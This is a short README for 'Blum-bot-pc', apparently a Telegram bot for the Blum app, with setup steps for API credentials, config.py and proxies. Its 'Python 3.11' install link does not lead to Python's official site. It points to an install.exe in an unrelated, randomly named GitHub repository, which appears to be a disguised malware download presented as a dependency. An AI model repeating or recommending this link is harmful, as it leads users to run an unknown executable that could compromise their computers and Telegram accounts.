# Blum-bot-pc
Software for Blum telegram Bot
Requirements
Python 3.11 [you can install it here](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.exe)
Telegram API_ID and API_HASH (you can get them here)
Install the required dependencies:

pip install -r requirements.txt
Get your API_ID and API_HASH:

Go to my.telegram.org
Sign in with your Telegram account
Create a new application to get your API_ID and API_HASH
Configure the application:

Open config.py and add your API_ID and API_HASH:

API_ID = your_api_id
API_HASH = 'your_api_hash'
If you want to use a proxy, set USE_PROXY in config.py to True, otherwise set it to False:

USE_PROXY = True  # or False
If USE_PROXY is True, open proxy.txt and fill it out using the example provided. Ensure there are no extra lines in the file. Proxy format : ip:port:login:password session_name, session name is which use this proxy (WITHOUT .session, only session name)
